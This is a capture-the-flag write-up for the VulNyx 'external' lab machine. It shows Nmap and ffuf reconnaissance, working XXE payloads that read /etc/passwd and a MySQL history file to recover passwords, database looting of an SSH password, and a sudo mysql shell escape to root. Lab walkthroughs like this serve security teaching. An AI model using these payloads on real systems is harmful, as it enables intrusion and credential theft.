# external

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| external | d4t4s3c | Easy | VulNyx |

**Summary:** The external machine exposed SSH on port 22, an Apache web server returning a 404 page on port 80, and a MariaDB instance on port 3306. An HTML comment embedded in the default page revealed that the hostname `ext.nyx` needed to be configured, and subdomain fuzzing with ffuf uncovered `administrator.ext.nyx`, which hosted an admin panel with an XML input form. The form was vulnerable to XML External Entity injection, which was exploited to read `/etc/passwd` and discover the `admin` user, then to read `/home/admin/.mysql_history` and extract the MySQL root password `r00tt00rDB`. Connecting to MariaDB as root revealed a `credentials` table in the `admindb` database containing the admin user's SSH password `4dminDBS3cur3P4ssw0rd123`. SSH access as `admin` was achieved, and sudo enumeration showed passwordless access to `/usr/bin/mysql` as root. Exploiting mysql's shell escape command escalated privileges to root, and both flags were retrieved.

---

## Reconnaissance

The engagement began by locating the target on the local network and enumerating its TCP attack surface.

1. An Nmap host discovery sweep identified the target at `192.168.56.168`:

```zsh
~/projects/labs/nyx                                                                11:23:58  
❯ sudo nmap -sn -PR 192.168.56.0/24    
[sudo] password for setyanoegraha:    
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-04 11:24 +0700  
Nmap scan report for 192.168.56.100  
Host is up (0.00044s latency).  
MAC Address: 08:00:27:F6:8C:4D (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.168  
Host is up (0.00062s latency).  
MAC Address: 08:00:27:18:F5:A9 (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.1  
Host is up.  
Nmap done: 256 IP addresses (3 hosts up) scanned in 9.72 seconds  
  
~/projects/labs/nyx                                                                14s 11:24:15  
❯ ip=192.168.56.168  
```

2. A full TCP scan with service detection found SSH, HTTP, and MySQL:

```zsh
~/projects/labs/nyx                                                                11:24:32  
❯ nmap -p- -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-04 11:24 +0700  
Nmap scan report for 192.168.56.168  
Host is up (0.00022s latency).  
Not shown: 65532 closed tcp ports (conn-refused)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
| ssh-hostkey:   
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)  
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)  
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)  
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))  
|_http-server-header: Apache/2.4.56 (Debian)  
|_http-title: 404 Not Found  
3306/tcp open  mysql   MariaDB 5.5.5-10.5.19  
| mysql-info:   
|   Protocol: 10  
|   Version: 5.5.5-10.5.19-MariaDB-0+deb11u2  
|   Thread ID: 7  
|   Capabilities flags: 63486  
|   Some Capabilities: IgnoreSigpipes, LongColumnFlag, SupportsTransactions, Support41Auth, ConnectWithDatabase, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, FoundRows, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults  
|   Status: Autocommit  
|   Salt: bN=%AY{#5"I)/N~PR.+.  
|_  Auth Plugin Name: mysql_native_password  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds  
```

3. Curling the web server returned a 404 page, but an HTML comment at the bottom revealed a pending DNS configuration for `ext.nyx`:

```zsh
/projects/labs/nyx                                                                11:25:31  
❯ curl -iv http://$ip/                  
*   Trying 192.168.56.168:80...  
* Established connection to 192.168.56.168 (192.168.56.168 port 80) from 192.168.56.1 port 54754  
* using HTTP/1.x  
> GET / HTTP/1.1  
> Host: 192.168.56.168  
> User-Agent: curl/8.21.0  
> Accept: */*  
>   
* Request completely sent off  
< HTTP/1.1 200 OK  
HTTP/1.1 200 OK  
< Date: Fri, 04 Sep 2026 04:25:33 GMT  
Date: Fri, 04 Sep 2026 04:25:33 GMT  
< Server: Apache/2.4.56 (Debian)  
Server: Apache/2.4.56 (Debian)  
< Last-Modified: Sun, 14 May 2023 17:49:14 GMT  
Last-Modified: Sun, 14 May 2023 17:49:14 GMT  
< ETag: "102-5fbaaf4dfc0b1"  
ETag: "102-5fbaaf4dfc0b1"  
< Accept-Ranges: bytes  
Accept-Ranges: bytes  
< Content-Length: 258  
Content-Length: 258  
< Vary: Accept-Encoding  
Vary: Accept-Encoding  
< Content-Type: text/html  
Content-Type: text/html  
  
<html><head>  
<title>404 Not Found</title>  
</head><body>  
<h1>Not Found</h1>  
<p>The requested URL was not found on this server.</p>  
</body></html>  
<!--  
[Pending Tasks]  
  
configure DNS: ext.nyx  
-->  
* Connection #0 to host 192.168.56.168:80 left intact  
```

4. The hostname `ext.nyx` was added to `/etc/hosts`, and subdomain fuzzing with ffuf discovered `administrator.ext.nyx`:

```zsh
~/projects/labs/nyx                                                                11:26:17  
❯ echo "$ip ext.nyx" | sudo tee -a /etc/hosts  
[sudo] password for setyanoegraha:    
192.168.56.168 ext.nyx  
```

```zsh
~/projects/labs/nyx                                                                11:27:40  
❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$ip/ -H "Host: FUZZ.ext.nyx" -fs 258  
  
        /'___\  /'___\           /'___\         
       /\ \__/ /\ \__/  __  __  /\ \__/         
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\        
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
          \ \_\   \ \_\  \ \____/  \ \_\         
           \/_/    \/_/   \/___/    \/_/         
  
       git-20260820-33c67d28  
 ________________________________________________  
  
 :: Method           : GET  
 :: URL              : http://192.168.56.168/  
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  
 :: Header           : Host: FUZZ.ext.nyx  
 :: Follow redirects : false  
 :: Calibration      : false  
 :: Timeout          : 10  
 :: Threads          : 40  
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
 :: Filter           : Response size: 258  
 ________________________________________________  
  
administrator              [Status: 200, Size: 1089, Words: 340, Lines: 26, Duration: 8ms]  
:: Progress: [5000/5000] :: Job [1/1] :: 58 req/sec :: Duration: [0:00:04] :: Errors: 0 ::  
```

---

## Initial Access

### XXE Injection to Credential Extraction

5. The `administrator.ext.nyx` subdomain was added to `/etc/hosts` and revealed an admin panel with an XML based registration form:

```zsh
~/projects/labs/nyx                                                                11:27:55  
❯ echo "$ip administrator.ext.nyx" | sudo tee -a /etc/hosts  
192.168.56.168 administrator.ext.nyx  
```

```zsh
~/projects/labs/nyx                                                                11:29:30  
❯ curl -i http://administrator.ext.nyx/                
HTTP/1.1 200 OK  
Date: Fri, 04 Sep 2026 04:30:09 GMT  
Server: Apache/2.4.56 (Debian)  
Last-Modified: Sun, 14 May 2023 14:09:50 GMT  
ETag: "441-5fba7e43a853c"  
Accept-Ranges: bytes  
Content-Length: 1089  
Vary: Accept-Encoding  
Content-Type: text/html  
  
<html>  
   <head>  
       <title>Admin Panel</title>  
       <link rel="stylesheet" href="style.css">  
       <script type="text/javascript" src="js/jquery.min.js"></script>  
       <script type="text/javascript" src="js/jquery.main.js"></script>  
   </head>  
   <body>  
       <div class="main-container"><br><br><br><br>  
           <div class="form-container">  
               <div class="form-body">  
                   <h1 class="title"><strong>Admin Panel</strong></h1><br><br>  
                   <div class="the-form">  
                       <label for="email">Email</label>  
                       <input id="email" name="email" type="email" placeholder="Enter your email">  
                       <label for="password">Password</label>  
                       <input id="password" name="password" type="password" placeholder="Enter your password">  
                       <input type="submit" value="Register" onclick="XMLFunction()">  
                   </div>  
               </div>  
           </div>  
       </div><br><br><br>  
       <div id="e"></div>  
   </body>  
</html>  
```

6. The `jquery.main.js` script revealed that form data was serialized as XML and posted to `form.php`:

```zsh
~/projects/labs/nyx                                                                11:30:11  
❯ curl -s http://administrator.ext.nyx/js/jquery.main.js  
function XMLFunction(){  
   var xml = '' +  
       '<?xml version="1.0" encoding="UTF-8"?>' +  
       '<details>' +  
       '<email>' + $('#email').val() + '</email>' +  
       '<password>' + $('#password').val() + '</password>' +  
       '</details>';  
   var xmlhttp = new XMLHttpRequest();  
   xmlhttp.onreadystatechange = function () {  
       if(xmlhttp.readyState == 4){  
           console.log(xmlhttp.readyState);  
           console.log(xmlhttp.responseText);  
           document.getElementById('e').innerHTML = xmlhttp.responseText;  
       }  
   }  
   xmlhttp.open("POST","form.php",true);  
   xmlhttp.send(xml);  
};  
```

7. An XXE payload was crafted to read `/etc/passwd` through the `file:///` protocol, confirming the vulnerability and revealing an `admin` user with a login shell:

```zsh
~/projects/labs/nyx                                                                11:32:04  
❯ curl -s -i -X POST http://administrator.ext.nyx/form.php -H "Content-Type: application/xml" --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE details [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><details><email>&xxe;</email><password>test</password></details>'  
HTTP/1.1 200 OK  
Date: Fri, 04 Sep 2026 04:32:03 GMT  
Server: Apache/2.4.56 (Debian)  
Vary: Accept-Encoding  
Content-Length: 1532  
Content-Type: text/html; charset=UTF-8  
  
<p align='center'> <font color=white size='5pt'> root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin  
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false  
admin:x:1000:1000:admin,,,:/home/admin:/bin/bash  
is already registered! </font> </p>%  
```

8. The XXE vulnerability was leveraged further to read `/home/admin/.mysql_history`, which exposed the MySQL root password `r00tt00rDB`:

```zsh
~/projects/labs/nyx                                                                11:35:32  
❯ curl -s -i -X POST http://administrator.ext.nyx/form.php -H "Content-Type: application/xml" --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE details [<!ENTITY xxe SYSTEM "file:///home/admin/.mysql_history">]><details><email>&xxe;</email><password>test</password></details>'  
HTTP/1.1 200 OK  
Date: Fri, 04 Sep 2026 04:37:35 GMT  
Server: Apache/2.4.56 (Debian)  
Vary: Accept-Encoding  
Content-Length: 141  
Content-Type: text/html; charset=UTF-8  
  
<p align='center'> <font color=white size='5pt'> ALTER USER 'root'@'%' IDENTIFIED BY 'r00tt00rDB';  
exit;  
is already registered! </font> </p>%s  
```

9. Connecting to MariaDB as root with the extracted password revealed an `admindb` database containing a `credentials` table with the admin user's SSH password:

```zsh
~/projects/labs/nyx                                                                11:38:36  
❯ mariadb -h $ip -u root -p'r00tt00rDB' --skip-ssl  
Welcome to the MariaDB monitor.  Commands end with ; or \g.  
Your MariaDB connection id is 19  
Server version: 10.5.19-MariaDB-0+deb11u2 Debian 11  
  
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  
  
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  
  
MariaDB [(none)]> show databases;  
+--------------------+  
| Database           |  
+--------------------+  
| admindb            |  
| information_schema |  
| mysql              |  
| performance_schema |  
+--------------------+  
4 rows in set (0.005 sec)  
  
MariaDB [(none)]> use admindb;  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Database changed  
MariaDB [admindb]> show tables;  
+-------------------+  
| Tables_in_admindb |  
+-------------------+  
| credentials       |  
+-------------------+  
1 row in set (0.001 sec)  
  
MariaDB [admindb]> select * from credentials;  
+------+-------+--------------------------+  
| id   | user  | password                 |  
+------+-------+--------------------------+  
|    1 | admin | 4dminDBS3cur3P4ssw0rd123 |  
+------+-------+--------------------------+  
1 row in set (0.008 sec)  
  
MariaDB [admindb]>  
```

10. SSH access was established as `admin` using the extracted password, and sudo enumeration revealed passwordless access to `/usr/bin/mysql` as root:

```zsh
~/projects/labs/nyx                                                                11:40:00  
❯ ssh admin@$ip  
** WARNING: connection is not using a post-quantum key exchange algorithm.  
** This session may be vulnerable to "store now, decrypt later" attacks.  
** The server may need to be upgraded. See https://openssh.com/pq.html  
admin@192.168.56.168's password:   
Linux external 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64  
Last login: Sun May 14 19:02:14 2023 from 192.168.1.10  
admin@external:~$ id;whoami;hostname  
uid=1000(admin) gid=1000(admin) grupos=1000(admin)  
admin  
external  
admin@external:~$ sudo -l  
Matching Defaults entries for admin on external:  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User admin may run the following commands on external:  
    (root) NOPASSWD: /usr/bin/mysql  
```

---

## Privilege Escalation

### MySQL Shell Escape to Root

11. MySQL was invoked with sudo as root, and the `\! /bin/sh` escape command was used to obtain a root shell. Both flags were retrieved:

```zsh
admin@external:~$ sudo /usr/bin/mysql -u root -p'r00tt00rDB' --skip-ssl -e '\! /bin/sh'  
# id;whoami;hostname  
uid=0(root) gid=0(root) grupos=0(root)  
root  
external  
# cat /home/admin/user.txt /root/root.txt  
934...  
059...  
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery identified `192.168.56.168` with SSH, HTTP, and MySQL. An HTML comment in the default 404 page revealed the hostname `ext.nyx`, and subdomain fuzzing uncovered `administrator.ext.nyx`.

2. **Vulnerability Discovery**: The admin panel on `administrator.ext.nyx` used XML for form submissions, and testing the `form.php` endpoint confirmed an XML External Entity injection vulnerability that could read arbitrary files from the server.

3. **Exploitation**: XXE was used to extract the MySQL root password from `/home/admin/.mysql_history`, then MariaDB was queried to find the admin user's SSH password in the `admindb.credentials` table, granting SSH access as `admin`.

4. **Internal Enumeration**: Sudo checks showed `admin` could run `/usr/bin/mysql` as root without a password, providing a direct path to privilege escalation through mysql's shell escape feature.

5. **Privilege Escalation**: MySQL was invoked with sudo and the `\! /bin/sh` escape command delivered a root shell, completing the attack chain and enabling flag retrieval.
